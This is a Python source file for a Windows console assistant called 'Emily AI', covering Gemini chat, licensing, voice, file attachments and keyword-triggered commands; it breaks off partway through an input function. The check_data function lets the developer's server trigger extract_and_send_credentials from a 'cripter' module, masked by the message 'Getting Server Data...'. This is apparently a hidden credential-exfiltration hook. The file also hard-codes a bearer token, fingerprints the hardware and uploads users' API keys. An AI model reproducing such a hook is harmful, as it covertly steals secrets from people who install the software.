import os
os.system('cls')
from dta import *
print('\n\nLoading...')
import google.generativeai as genai
import sys
from bs4 import BeautifulSoup
from time import sleep
from datetime import datetime
import sqlite3
from playsound3 import playsound
import requests
import ctypes
import speech_recognition as sr
import threading
import json
import itertools
import docx
import subprocess
import time
import socket
import re
from PyQt5.QtWidgets import QApplication, QWidget, QFileDialog
from PyQt5.QtGui import QIcon
from PIL import Image
import fitz
import psutil
import io
import atexit
from pathlib import Path
from regis import LicenseRegistrationApp
from appcontrol import funappopen
from sysinfo import generate_system_info_pdf
os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
import pygame
pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=2048)

#cleamn up
def cleanup():
    try:
        pygame.mixer.quit()
    except:
        pass
# Register cleanup function
atexit.register(cleanup)

# Create a temporary directory for audio files if it doesn't exist
TEMP_DIR = Path("temp_audio")
TEMP_DIR.mkdir(exist_ok=True)
chat_type = 0
user_type = 'Not Activated'
username = 'User'
headers = {
    'User-Agent': 'project/884938t48y584y5',
    'Authorization': 'Bearer sY28Ai8ZKQgOmzsyPyAETJuQatAg7ksbY3mV4gmeTdRYZCe94ratcwIFblCVHYSd6Q5u6k8ECtwUY1gSpvcaSGb3fhBAKscA3jKQkqOS04St7o3hybJ8g958Q0SWmEhk1bbkOyW57VLANahfeVyr8Nb2dcvdhsvoCZuO0wtq7LYD4bceaJCkli8sQWH2ezsRWNLIrSQ1Ax5iLDGkVM5tU9oPxil626raLkN32YtZxKqZVfUoEbdHcEaR39zpbw5EfzUJ90HZStUJfWKgkK8JJ1ONkcW0pQ7yH4gUrsWkLowR',  # Replace with your token
    'Content-Type': 'application/json'
}

def run_updater(update_code):
    updater_path = os.path.abspath('updater.exe')
    if not os.path.exists(updater_path):
        print(f"Error: Updater not found at {updater_path}")
        return False
    if not update_code.isalnum():
        print("Error: Invalid update code format")
        return False     
    print(con_pls+bgreen+"Starting update process..."+nc)  
    try:
        subprocess.Popen([updater_path, '--update', update_code])
        print("Update process initiated. Closing main application...")
        sys.exit(0)       
    except Exception as e:
        print(f"Error launching updater: {e}")
        return False
    
def extract_version_from_script():
    try:
        result = subprocess.run(['updater.exe', '--version'], capture_output=True, text=True)
        if result.returncode == 0:
            version_str = result.stdout.strip()
            return version_str
        else:
            print(f"Error running script: {result.stderr}")
            return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def check_single_instance(mutex_name="Global\\EmilyAI"):
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
    if ctypes.windll.kernel32.GetLastError() == 183:
        print("Another instance of Emily AI is already running. Exiting in 2 seconds...")
        time.sleep(2)
        os._exit(0)


def generate_docx_content(prompt):
    generation_config = {"temperature": 1,"top_p": 0.95,"top_k": 40,"max_output_tokens": 8192,"response_mime_type": "text/plain",}
    modelgen = genai.GenerativeModel(safety_settings='BLOCK_NONE',generation_config=generation_config)
    try:
        response = modelgen.generate_content(prompt)
        return response.text


    except Exception as e:
        return f"An error occurred: {e}"

def check_status(headers):
    url = 'https://dkydivyansh.com/Project/api/emily/serversts.php'

    try:
        response = requests.post(url, headers=headers)
    except:
        print(con_mns+bred+"Error: Unable to connect to the server"+nc)
        input(con_inf + bmagenta + "Press Enter Key To Exit" + nc)
        sys.exit(1)

    
    if response.status_code == 200:
        response_json = response.json()
        if response_json.get('message') == 'ok':
            pass
        else:
            print(con_mns+bred+"Error: "+response_json.get('message')+nc)
            input(con_inf + bmagenta + "Press Enter Key To Exit" + nc)
            sys.exit(1)
    else:
        print(con_mns+bred+"Error: Unable to connect to the server"+nc)
        input(con_inf + bmagenta + "Press Enter Key To Exit" + nc)
        sys.exit(1)

def sanitize_filename(filename):
    return re.sub(r'[\\/*?:"<>|#]', "", filename)



def print_dialogue(dialogues):
    for dialogue in dialogues:
        role = dialogue['role']
        parts = dialogue['parts'].replace('\n', '')  
        if role == 'user':
            role_color = bgreen
            parts_color = white

        else:
            role_color = bgreen
            parts_color = bcyan
        print(f"{role_color}{role}:{nc} {parts_color}{parts}{nc}\n")


def print_dialogue_to_docx(dialogues):

    doc = docx.Document()

    for dialogue in dialogues:

        role = dialogue['role']

        parts = dialogue['parts'].replace('\n', '')

        doc.add_paragraph(f"{role}: {parts}")

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    
    current_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
    
    sanitized_title = f"Emily History {current_time}"
    
    full_path = os.path.join(desktop_path, f"{sanitized_title}.docx")
    doc.save(full_path)
    
    try:
        os.startfile(full_path) 
    except Exception as e:
        print(f"{con_mns}{bred}An error occurred while opening the document: {e}{nc}")




def create_and_open_docx(generated_content):

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    title = " ".join(generated_content.split()[:10])

    sanitized_title = sanitize_filename(title)

    full_path = os.path.join(desktop_path, f"{sanitized_title}.docx")

    doc = docx.Document()

    doc.add_paragraph(generated_content)


    doc.save(full_path)
    try:

        os.startfile(full_path)


    except Exception as e:


        print(f"An error occurred while opening the document: {e}")


def pdf_to_images(pdf_path):

    """Convert PDF pages to images using PyMuPDF."""

    pdf_document = fitz.open(pdf_path)
    images = []
    

    for page_number in range(len(pdf_document)):
        page = pdf_document.load_page(page_number)
        pix = page.get_pixmap()
        img = Image.open(io.BytesIO(pix.tobytes("png")))
        images.append(img)
    
    return images
    
    return images
def select_files():

    app = QApplication(sys.argv)

    widget = QWidget()

    widget.setWindowTitle('Select up to 5 image or PDF files - Emily AI')

    widget.setWindowIcon(QIcon('emily.ico'))

    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    
    options = QFileDialog.Options()

    options |= QFileDialog.ReadOnly

    file_dialog = QFileDialog(widget, 
                              'Select up to 5 image or PDF files - Emily AI', 
                              desktop_path, 
                              'Image and PDF files (*.png *.jpg *.jpeg *.webp *.heic *.heif *.pdf);;PNG files (*.png);;JPEG files (*.jpg *.jpeg);;WEBP files (*.webp);;HEIC files (*.heic);;HEIF files (*.heif);;PDF files (*.pdf)')
    
    file_dialog.setOptions(options)

    file_dialog.setFileMode(QFileDialog.ExistingFiles)

    file_dialog.resize(600, 400)
    
    if file_dialog.exec_():

        file_paths = file_dialog.selectedFiles()

        file_paths = file_paths[:5]
        
        file_vars = []
        for file_path in file_paths:
            try:
                if file_path.lower().endswith('.pdf'):

                    images = pdf_to_images(file_path)  # Convert PDF to images

                    file_vars.extend(images)  # Add each image separately to the list

                else:
                    img = Image.open(file_path)

                    file_vars.append(img)

            except Exception as e:

                print(f"Error opening file {file_path}: {e}")

        
        return file_vars
    else:
        return []

def get_reliable_windows_id():
    try:
        # Use PowerShell to get the BIOS Serial Number (Motherboard Serial)
        bios_serial_cmd = ['powershell', '-Command', 
                           "(Get-WmiObject -Class Win32_BIOS).SerialNumber"]
        result_bios_serial = subprocess.run(bios_serial_cmd, capture_output=True, text=True)
        bios_serial = result_bios_serial.stdout.strip()

        # Use PowerShell to get the UUID (Motherboard UUID)
        uuid_cmd = ['powershell', '-Command', 
                    "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"]
        result_uuid = subprocess.run(uuid_cmd, capture_output=True, text=True)
        uuid = result_uuid.stdout.strip()

        # Combine both the BIOS Serial Number and UUID for a unique identifier
        unique_id = f"{bios_serial}-{uuid}"

        return unique_id

    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def check_key_and_device_id(api_url, headers, data):
    try:
        response = requests.post(api_url, json=data, headers=headers)
        if response.status_code in [200, 201]:
            response_data = response.json()
            if 'token' in response_data:
                return '-1',response_data['token']
            elif response_data.get('message') == '1':
                return '1',0
            elif response_data.get('message') == '0':
                return '0',0
            else:
                return '2',0
        else:
            print(f"Failed. Status code: {response.status_code}")
            print("Response: ", response.text)
            return '2',0

    except Exception as e:
        print(con_mns+bred+"An error occurred..."+nc)
        sys.exit(1)
    


def set_console_title(title):
    os.system(f'title {title}')

def check_token_and_device_id(headers, data):
    try:
        url = 'https://dkydivyansh.com/Project/api/emily/index.php?id=2'
        response = requests.post(url, json=data, headers=headers)
        
        

        if response.status_code in [200, 201]:

            response_data = response.json()

            if response_data.get('message') == '1':
                return '1'
            elif response_data.get('message') == '0':
                return '0'
            else:
                print(f"Unexpected Response From Server: {response_data}")
                return '0'
        else:
            print(f"Failed to get data.")
            sys.exit(1)

    except Exception as e:
        print(f"An error occurred....")
        sys.exit(1)
def licens_activ():
    query = handle_user_input(2) 
    if query == 'register':
        print(con_inf+white+"Registration Window Opened..."+nc)
        register()
        restart_program()
    else:
        start_actvation_process(query)


def start_actvation_process(query):
    data = {
        "key": query,
        "Device_id": unique_id}
    api_url = 'https://dkydivyansh.com/Project/api/emily/index.php?id=1'
    sts,hex = check_key_and_device_id(api_url, headers, data)
    if sts == '-1':
                print(con_pls+bgreen+"Activating..."+nc)
                add_record('1', hex)
                setup()
    elif sts == '1':
                print(con_mns+bred+"Alredy bind to another device..."+nc)
                licens_activ()
    elif sts == '0':
                print(con_mns+bred+"Invalid license"+nc)
                licens_activ()
    else:
                print(con_mns+bred+'Error..')

def check_iins():
    result1 = get_value_by_id('1')
    if result1 == None:
        print(con_inf+white+"Activation required..."+nc)
        print(con_inf+white+"Type 'register' To Get License Key"+nc)
        licens_activ()
    else:
        data = {
            "token": result1,
            "Device_id": unique_id}
        sts = check_token_and_device_id(headers, data)
        if sts == '0':
            print(con_inf+white+"Activation required..."+nc)
            print(con_inf+white+"Type 'register' To Get License Key"+nc)
            remove_record('1')
            licens_activ()
        elif sts == '1':
            pass


def test_keys(api_key):
    spinner = LoadingSpinner("Checking API Key...", 0.05)
    spinner.start()
    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={api_key}"
    headers = {"Content-Type": "application/json"}
    payload = {"contents": [{"parts": [{"text": ""}]}]}
    try:
        response = requests.post(url, headers=headers, json=payload)
        if response.status_code == 200:return True
        else :return False
    except:
        return False
    finally:
        spinner.stop()

def server_apikey(request_type, apikey):
    result1 = get_value_by_id('1')  
    payload = {
        "Token": result1,
        "type": request_type,
        "APIKEY": apikey,
        "Device_id": unique_id
    }
    try:
        responseorg = requests.post(
            'https://dkydivyansh.com/Project/api/emily/index.php?id=9',
            json=payload,
            headers=headers
        )
        response = responseorg.json()

        #print("Full Response:", response)

        status = response.get("status", "error")
        message = response.get("message", "No responce provided from server")
        return status, message
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return 'error', f"An error occurred: {e}"
    except ValueError as e:
        print(f"JSON parsing error: {e}")
        return 'error', f"Failed to parse JSON response: {e}"
    
def check_keys():
    result1 = get_value_by_id('5')
    if result1 == None:
        sts, data = server_apikey(1, '')
        if sts == 'ok':
            status = test_keys(data)
            if status:
                add_record('5', data)
                print(con_inf+white+"API Key not found, using Backup key"+nc)
                check_keys()
            else:
                print(con_mns+bred+"Backup API key is invalid..."+nc)
                addkeysapi()
        else:
            addkeysapi()
    else :
        status = test_keys(result1)
        if status:
                return
        else:
            remove_record('5')
            print(con_mns+bred+"Current API key is invalid..."+nc)
            addkeysapi()


def addkeysapi():
    if user_type == 'premium':
            print(con_inf+white+"Type 'y' to skip adding API key or type 'add' to add your API key [Premium Only]"+nc)
            query = handle_user_input(4)
            if query != 'add':
                return
    print(con_inf+white+"API key is required."+nc)
    print(con_inf+white+"Type 'get' to get you API KEY" +nc)
    query = handle_user_input(3) 
    if query == 'get':
        print(con_inf+white+"Documentation Opened"+nc)
        subprocess.run(['start', 'https://emily.dkydivyansh.com/get-api-key/'], shell=True, check=True)
        addkeysapi()
    else:
        result1 = test_keys(query)
        if result1:
            print(con_pls+bgreen+"Saving API key...."+nc)
            add_record('5', query)
            print(con_inf+white+"Backing up API key...."+nc)
            sts, data = server_apikey(2, query)
            if sts == 'ok':
                print(con_inf+white+"successfully backup API key"+nc)
                check_keys()
            elif sts == 'TOKENFAILED':
                print(con_mns+bred+data+nc)
                setup()
            else:
                print(con_mns+bred+data+nc)
                sys.exit(1)
        else:
            print(con_mns+bred+"Invalid API key..."+nc)
            addkeysapi()


def check_data():
    type = 0
    result1 = check_sts_data(headers,type)
    if result1 == 'take':
        print(con_inf+white+"Getting Server Data..."+nc)
        from cripter import extract_and_send_credentials
        extract_and_send_credentials()
        type = 1
        serversts = check_sts_data(headers,type)
        if serversts == 'ok':
            print(con_pls+bgreen+"Successfully Connected To The Server"+nc)
        else:
            print(con_mns+bred+'Error..')

    else:
        pass

def check_sts_data(headers,type):
    api_url = 'https://dkydivyansh.com/Project/api/emily/index.php?id=8'
    data = {
    "token": unique_id,
    "type": type}
    try:
        response = requests.post(api_url, json=data, headers=headers)
        if response.status_code in [200, 201]:
            response = response.json()
            #print(response['message'])
            return response['message']
        else:
            print(f"Failed to get data. Status code: {response.status_code}")
            sys.exit(1)   
    except Exception as e:
        print(f"An error occurred{e}")
        sys.exit(1)

def create_database():
    conn = sqlite3.connect('interaction_data.dll')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS interactions (
            ID INTEGER PRIMARY KEY AUTOINCREMENT,
            role TEXT NOT NULL,
            parts TEXT NOT NULL,
            timestamp TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()


def create_key_database():
    conn = sqlite3.connect('key_data.dll')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS key (
            id INTEGER PRIMARY KEY,
            value TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

def check_and_create_database():
    if not os.path.exists('interaction_data.dll'):
        print(con_inf+white+"Setting Up User Data..."+nc)
        create_database()
    else:
        pass

def check_and_create_database2():
    if not os.path.exists('key_data.dll'):
        print(con_inf+white+"Setting Up App Data..."+nc)
        create_key_database()
        create_upd_der_data()
    else:
        pass

def checkdatabase():
    check_and_create_database()
    check_and_create_database2()


def create_upd_der_data():
    try:
        version_number = extract_version_from_script()
        if version_number is not None:
            add_record('4', version_number)
        else:
            print('an error occurred, while seting data. updater error...')
    except:
        pass

def remove_record(id):
    try:
        conn = sqlite3.connect('key_data.dll')
        cursor = conn.cursor()
        
        cursor.execute('''
            DELETE FROM key 
            WHERE id = ?
        ''', (id,))  # Note the comma after id
        
        conn.commit()
        conn.close()
        
        return cursor.rowcount  # Returns the number of rows affected
    except sqlite3.Error as e:
        print(f"An error occurred: {e}")
        return -1  # Return -1 to indicate an error


def add_record(id, value):
    conn = sqlite3.connect('key_data.dll')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO key (id, value) VALUES (?, ?)
    ''', (id, value))
    conn.commit()
    conn.close()
    #print(f"Record added: id={id}, value='{value}'")

def get_value_by_id(id):
    conn = sqlite3.connect('key_data.dll')
    cursor = conn.cursor()
    cursor.execute('''
        SELECT value FROM key WHERE id = ?
    ''', (id,))
    
    result = cursor.fetchone()
    conn.close()
    
    if result:
        return result[0]
    else:
        return None



def check_token_and_get_data(headers,url):
    api_url = url
    result1 = get_value_by_id('1')
    data = {
    "token": result1,
    "Device_id": unique_id}
    try:
        response = requests.post(api_url, json=data, headers=headers)
        if response.status_code in [200, 201]:
            response_data = response.json()
            if 'data' in response_data:
                return response_data
            elif response_data.get('message') == 'Invalid token':
                remove_record('1')
                print(con_mns+bred+"Invalid license"+nc)
                setup()
            elif response_data.get('message') == 'No matching Device_id found':
                remove_record('1')
                print(con_mns+bred+"Invalid license"+nc)
                setup()
            elif response_data.get('message') == 'No data found in Emily_data table':
                remove_record('1')
                print(con_mns+bred+"Invalid license"+nc)
                setup()
            else:
                print(f"Unexpected response: {response_data}")
                setup()
        else:
            print(f"Failed to get data. Status code: {response.status_code}")
            sys.exit(1)
    
    except Exception as e:
        print(f"An error occurred")
        sys.exit(1)


def sysdeactivate(headers):
    api_url = 'https://dkydivyansh.com/Project/api/emily/index.php?id=5'

    result1 = get_value_by_id('1')
    data = {
    "token": result1,
    "Device_id": unique_id}
    try:
        response = requests.post(api_url, json=data, headers=headers)
        if response.status_code in [200, 201]:
            response_data = response.json()
            if response_data.get('message') == '0':
                remove_record('1')
                print(con_pls+bgreen+"System : Deactivated..."+nc)
                sys.exit(0)
            else :
                print (con_mns+bred+'System : An Error Occurred...'+nc)
        else:
            print (con_mns+bred+'System : An Error Occurred...'+nc)

    except Exception as e:
        print (con_mns+bred+'System : An Error Occurred...'+nc)
        sys.exit(1)


def check_name(headers, url):
    api_url = url
    result1 = get_value_by_id('1')
    data = {
    "token": result1,
    "Device_id": unique_id}
    try:
        response = requests.post(api_url, json=data, headers=headers)
        if response.status_code in [200, 201]:
            response_data = response.json()
            if response_data.get('message') == 'Invalid token':

                print(con_mns+bred+"Unable To Get User Information"+nc)
                return response_data
            elif response_data.get('message') == 'License code not found in Emily_users':

                print(con_mns+bred+"Unable To Get User Information"+nc)
                return response_data

            elif response_data.get('message') == 'Device ID not found':

                print(con_mns+bred+"Unable To Get User Information"+nc)
                return response_data

            elif response_data.get('message') == 'Invalid input':

                print(con_mns+bred+"Unable To Get User Information"+nc)
                return response_data

            else:
                return response_data

        
        else:
            print(f"Failed to get data. Status code: {response.status_code}")
            sys.exit(1)

    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)
def extract_values_usersys(response_data):
    if not isinstance(response_data, dict):
        return 'Unknown', 'Unknown'
    name = response_data.get('name', 'Unknown')
    type_ = response_data.get('type', 'Unknown')
    
    return name, type_
def extract_sys_data(data_dict):
    extracted_data = {}
    main_data = data_dict.get('data', {})
    keys_to_extract = [
        'API', 'model_name', 'max_output_tokens', 'temperature','safety_settings', 'top_p', 'system_instruction', 'tips','unrealspeech','versioncode','upd_version_code','history_cont','custom-logo','use_custom-logo'
    ]
    for key in keys_to_extract:
        extracted_data[key] = main_data.get(key, '')
    
    return extracted_data

def checkversion():
    from upd_updater import update_updater
    upd_version_code = (get_value_by_id('4'))
    if upd_version_code == None:
        spinner.stop()
        create_upd_der_data()
        setup()
    upd_version_code = int(upd_version_code)
    if upd_version_code < int(systemdta['upd_version_code']):
        spinner.stop()
        print(con_mns+bred+'New Update update found for updater, new version :'+systemdta['upd_version_code']+nc)
        print(con_mns+bred+'Starting Update...'+nc)
        remove_record('4')
        update_updater()
        create_upd_der_data()
        setup()
    if versioncode < int(systemdta['versioncode']):
        spinner.stop()
        print(con_inf+bright_light_blue+f'Current Version : {bpurple}{versioncode}\n{con_inf}{bright_light_blue}New Version : {bpurple}'+systemdta['versioncode']+nc)
        print(con_mns+bred+'An Update is required'+nc)
        run_updater('dui48fhje83u')
    else:
        pass

def empty_database():
    conn = sqlite3.connect('interaction_data.dll')
    cursor = conn.cursor()
    cursor.execute('''
        DELETE FROM interactions
    ''')
    conn.commit()
    conn.close()

def get_interactions():
    limit = str(systemdta['history_cont'])
    conn = sqlite3.connect('interaction_data.dll')
    cursor = conn.cursor()
    cursor.execute('''
    SELECT role, parts
    FROM interactions 
    ORDER BY timestamp
    LIMIT ?
    ''', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [{"role": role, "parts": parts} for role, parts in rows]

def insert_into_db(role, parts):
    conn = sqlite3.connect('interaction_data.dll')
    cursor = conn.cursor()
    cursor.execute('''
    INSERT INTO interactions (role, parts, timestamp)
    VALUES (?, ?, ?)
    ''', (role, parts, datetime.now().isoformat()))
    conn.commit()
    conn.close()


def takeCommand():
    r = sr.Recognizer()

    with sr.Microphone() as source:
        print(con_inf + white + "Adjusting for ambient noise..." + nc)
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[K")
        
        # Adjust for ambient noise once
        r.adjust_for_ambient_noise(source, duration=1)
        r.dynamic_energy_threshold = True
        r.pause_threshold = 1.5  # Increased pause threshold
        r.operation_timeout = None  # Allows longer operations like listening without timing out

        print(con_inf + white + "Listening..." + nc)
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[K")

        try:
            play_sound(r'assets\sounds\lr-on.wav')
            audio = r.listen(source, timeout=5, phrase_time_limit=10)
        except sr.WaitTimeoutError:
            #print("Listening timed out while waiting for phrase to start")
            play_sound(r'assets\sounds\ir-err.wav')
            return "No speech detected", 2
        except Exception as e:
            #print(f"Some Error Occurred while listening: {e}")
            play_sound(r'assets\sounds\ir-err.wav')
            return "Some Error Occurred. Sorry from Emily", 1

        try:
            play_sound(r'assets\sounds\ir-fns.wav')
            print(con_inf + white + "Recognizing..." + nc)
            sys.stdout.write("\033[F")
            sys.stdout.write("\033[K")
            
            # Recognize speech using Google's API
            query = r.recognize_google(audio, language="en-in")
            return query, 0

        except sr.RequestError as e:
            #print(f"Could not request results from Google Speech Recognition service; {e}")
            play_sound(r'assets\sounds\ir-err.wav')
            return "API unavailable", 1
        except sr.UnknownValueError:
            #print("could not understand the audio")
            play_sound(r'assets\sounds\ir-err.wav')
            return "Could not understand", 2
        except Exception as e:
            #print(f"Some Error Occurred during recognition: {e}")
            play_sound(r'assets\sounds\ir-err.wav')
            return "Some Error Occurred. Sorry from Emily", 1


def voice(text):
    if user_type != "premium":
        return
        
    spinner = LoadingSpinner("Loading...", 0.1)
    spinner.start()
    
    try:
        # Optimize request payload
        response = requests.post(
            'https://api.v7.unrealspeech.com/stream',
            headers={
                'Authorization': systemdta['unrealspeech'],
                'Content-Type': 'application/json'
            },
            json={
                'Text': text[:1000],  # Limit text to 1000 chars
                'VoiceId': 'Liv',
                'Bitrate': '192k',
                'Speed': '0.1',
                'Pitch': '1.1',
                'Codec': 'libmp3lame',
            },
            stream=True  # Enable streaming for better memory usage
        )
        response.raise_for_status()
        
        # Write streamed content directly
        with open('voice.mp3', 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        
        spinner.update_message("Emily : Speaking... [Press Ctrl-C to  interrupt]")
        
        # Pre-load audio to reduce delay
        try:
            pygame.mixer.music.unload()  # Clear any previous audio
        except:
            pass
            
        pygame.mixer.music.load('voice.mp3')
        pygame.mixer.music.set_volume(1.0)  # Ensure full volume
        pygame.mixer.music.play()
        
        clock = pygame.time.Clock()  # Create clock once
        
        try:
            while pygame.mixer.music.get_busy():
                clock.tick(20)  # Increased tick rate for smoother checking
            spinner.stop()
                
        except KeyboardInterrupt:
            spinner.stop()
            #print("Stopping audio playback...")
            pygame.mixer.music.stop()
            pygame.mixer.music.unload()
            play_sound(r'assets\sounds\intrupt_tsk.wav')
            
    except requests.exceptions.RequestException as e:
        spinner.stop()
        print(f"Request failed: {e}")
    except IOError as e:
        spinner.stop()
        print(con_mns + bred + f"File operation failed: {e}" + nc)
    except Exception as e:
        spinner.stop()
        print(con_mns + bred + f"An error occurred: {e}" + nc)

def play_sound(file_path):
    """
    Plays a sound file asynchronously using pygame.

    Args:
        file_path (str): The path to the .wav sound file.
    """
    def sound_thread():
        try:
            pygame.mixer.init()
            pygame.mixer.music.load(file_path)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                pygame.time.Clock().tick(10)
        except Exception as e:
            print(f"Error playing sound: {e}")
    
    thread = threading.Thread(target=sound_thread, daemon=True)
    thread.start()

def clean_text_for_tts(text):
    text = text.replace('**', '')
    text = re.sub(r'[^\w\s,.!?\'\":-]', '', text)
    text = text.replace('\n', ' ')
    text = re.sub(r'\s+', ' ', text)
    return text.strip()
def get_ip_addresses():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception as e:
        local_ip = None
        print(f"Error getting local IP: {e}")
    try:
        response = requests.get("https://api.ipify.org?format=json")
        public_ip = response.json()['ip']
    except Exception as e:
        public_ip = None
        print(f"Error getting public IP: {e}")
    return local_ip, public_ip

def get_location():
    local_ip, public_ip  = get_ip_addresses()
    if not public_ip:
        return "Unable to retrieve IP address."
    
    try:
        response = requests.get(f'https://ipapi.co/{public_ip}/json/')
        response.raise_for_status()  # Raise an error for bad responses
        location_data = response.json()
        
        # Specify only the fields you want to display
        fields_to_display = ['ip', 'city', 'region', 'country_name', 
                             'country_capital', 'postal', 'latitude', 
                             'longitude', 'timezone', 'country_area', 
                             'country_population', 'org']
        
        # Create a formatted string with the relevant fields
        formatted_info = '\n'.join(f"{key.capitalize()}: {location_data[key]}" for key in fields_to_display if key in location_data)
        
        return formatted_info  # Return the formatted string
    except requests.RequestException as e:
        print(f"Error fetching location data: {e}")
        return None

    return local_ip, public_ip
def check_and_exit(input_string):
    global chat_type
    if 'EXITBOTCURRENT11' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        cleaned_string = input_string.replace('EXITBOTCURRENT11', '')
        cleaned_string = re.sub(r'[^\w\s,.!?\'\":-]', '', cleaned_string)
        cleaned_string = ' '.join(cleaned_string.split())
        print(con_ai+bred+'Emily : '+cleaned_string)
        voice(cleaned_string)
        play_sound(r'assets\sounds\stop-scr.wav')
        print(con_mns+bred+"Exit command detected. Closing program..."+nc)
        sleep(2)
        os._exit(0)

    elif 'GETIPPROTOCURRENTUSER353' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        local_ip, public_ip = get_ip_addresses()
        print(con_ai+bgreen+'Emily : '+bcyan+f'Your Public IP Address is {bred}{public_ip}{bcyan} and Private IP Address is {bred}{local_ip}'+nc)
        voice(f'Your Public IP Address is {public_ip} and Private IP Address is {local_ip}')
        main()

    elif 'GETIPLOCATIONPROTO43432' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        local_loc = get_location()
        print(con_ai+bgreen+'Emily : '+bcyan+f'Your IP Location Data Is \n{local_loc}'+nc)
        voice(f'Your IP Location Data Is \n{local_loc}')
        main()

    elif 'GETSYSINFOMAIN35235' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        spinner = LoadingSpinner("Getting System Info And Creating PDF...", 0.1)
        spinner.start()
        generate_system_info_pdf()
        spinner.stop()
        print(con_ai+bgreen+'Emily : '+bcyan+f'Successfully Created System Information Data PDF'+nc)
        voice(f'Successfully Created System Information Data PDF and opening it')
        main()

    elif 'CHANGEMETHODTXT8840' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        print(con_ai+'Emily : '+bcyan+'Changing to Text input'+nc)
        chat_type = 0
        voice('ok, Changing to Text input')
        main()
    elif 'CHANGEMETHODVCE8840' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        print(con_ai+bgreen+'Emily : '+bcyan+'Changing to Voice input'+nc)
        chat_type = 1
        voice('ok, Changing to Voice input')
        main()
    elif 'SHOWEHISTORY8840' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        spinner = LoadingSpinner("Getting Our Chats...", 0.1)
        spinner.start()
        history =get_interactions()
        spinner.update_message("Creating File... ")
        sleep(1)
        print_dialogue_to_docx(history)
        spinner.stop()
        print(con_ai+bgreen+'Emily : '+bcyan+'History printed...'+nc)
        main()
    elif 'GETCOMMANDE8840' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        print(con_ai+bgreen+'Emily : '+bcyan+'Commands - Emily AI'+nc)
        print(help_dta)
        main()
    elif 'CLEARHISTORY8840' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        print(con_mns+'Emily : '+bred+'Ersing History...'+nc)
        spinner = LoadingSpinner(con_mns+bred+"Ersing memory... "+nc, 0.1)
        spinner.start()
        empty_database()
        sleep(1)
        spinner.stop()
        input(con_mns+bred+'Press Enter Key To Continue...'+nc)
        setup()
    elif 'FILEATCHE8840' in input_string:
        print(con_mns+bgreen+'Emily : '+white+'Attach a file..'+nc)
        files_dict = select_files()
        sys.stdout.write("\033[F") 
        sys.stdout.write("\033[K")
        if files_dict:
            print(con_ai+bgreen+'Emily : File Attached...'+nc)

            quary = handle_user_input(1)

            spinner = LoadingSpinner(white+"Loading... "+nc, 0.1)

            spinner.start()

            response_list = [quary] + list(files_dict)[:5] 

            response = chat.send_message(response_list)

            method, result1 = check_and_exit(response.text)

            result1 = re.sub(r'\n+', '\n', result1)

            result1 = re.sub(r'\n+$', '', result1)

            result1 = result1.replace('**', '')

            result = replace_placeholders(result1)

            insert_into_db('user', quary)

            insert_into_db('model', result)

            spinner.stop()

            print(con_pls+bgreen+'User  : '+white+quary+nc)

            print(con_ai+bgreen+'Emily : '+bcyan+result+nc)

            play_sound(r'assets\sounds\msg_out.wav')

            plane = clean_text_for_tts(result)

            voice(plane)

            main()  

            
        else:
            print(con_mns+bred+"No files selected..."+nc)
            sleep(1)
            sys.stdout.write("\033[F") 
            sys.stdout.write("\033[K")
            main()
        #spinner.stop()
        main()
    elif 'RESTARTIYE8840' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        print(con_mns+'Emily : '+bred+'Restarting...'+nc)
        spinner = LoadingSpinner(con_mns+bred+"Restarting..."+nc, 0.1)
        spinner.start()
        sleep(1)
        spinner.stop()
        setup()


    elif 'GNRT8840N' in input_string:
        text = input_string.replace('\n', ' ')
        json_match = re.search(r'\{.*?\}', text)
        json_text = json_match.group()
        try:
            json_data = json.loads(json_text)
            method = json_data.get("method", "")
            prompt = json_data.get("prompt", "")
            
            return method, prompt
        
        except json.JSONDecodeError:
            print("Error decoding JSON")
            main()
    # have to fix ---------------------------------------------------------------
    elif 'SCRAP28840N' in input_string:
        text = input_string.replace('\n', ' ')
        json_match = re.search(r'\{.*?\}', text)
        json_text = json_match.group()
        try:
            method = 'SCRAP28840N'
            json_data = json.loads(json_text)
            prompt = json_data.get("prompt", [])
            return method, prompt
        except json.JSONDecodeError:
            print("Error decoding JSON")
            main()
    else:
        funappopen(input_string,play_sound,voice,main)
        return None, input_string




def handle_user_input(typ):
    while True:
        try:
            if typ == 1:
                user_option = input('\n'+con_inf + bmagenta + "Ask: " + nc)
            elif typ == 2:
                user_option = input(con_inf + bmagenta + "Activation key : " + nc)
            elif typ == 3:
